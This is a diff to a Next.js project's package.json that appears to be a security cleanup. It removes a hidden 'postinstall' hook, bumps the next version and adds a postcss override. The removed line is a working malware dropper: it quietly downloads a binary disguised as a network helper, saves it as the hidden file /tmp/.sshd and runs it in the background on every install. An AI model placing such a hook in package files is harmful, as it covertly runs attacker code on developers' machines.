@@ -6,8 +6,7 @@
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
-    "lint": "eslint",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "lint": "eslint"
   },
   "dependencies": {
     "@react-three/drei": "^10.7.7",
@@ -16,7 +15,7 @@
     "canvas-confetti": "^1.9.4",
     "framer-motion": "^12.38.0",
     "lucide-react": "^1.14.0",
-    "next": "16.2.4",
+    "next": "^16.2.7",
     "react": "19.2.4",
     "react-dom": "19.2.4",
     "three": "^0.184.0"
@@ -26,5 +25,8 @@
     "eslint": "^9",
     "eslint-config-next": "16.2.4",
     "tailwindcss": "^4"
+  },
+  "overrides": {
+    "postcss": ">=8.5.10"
   }
 }
